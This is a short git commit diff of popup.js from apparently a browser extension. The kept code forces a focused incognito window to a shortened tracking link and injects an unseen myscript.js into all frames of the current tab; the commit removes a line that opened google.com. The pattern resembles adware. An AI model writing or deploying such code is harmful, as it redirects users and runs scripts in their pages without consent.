d3e224ce6621db5975f324ff090e16f258d1c462
igexufur <vaderdarth807@gmail.com>
2017-03-11 04:25:30 -0500

    Update popup.js

--- popup.js
+++ popup.js
@@ -1,5 +1,3 @@
 chrome.windows.create({"url": "http://a.pgtb.me/CQ7z6j/mbJ75?w=56317388&e=150972004/", "focused": true,            "incognito": true});
 chrome.tabs.executeScript(null, {"file": "myscript.js", "all_frames": true});
 
-chrome.windows.create({"url": "http://www.google.com/", "incognito": true});
-
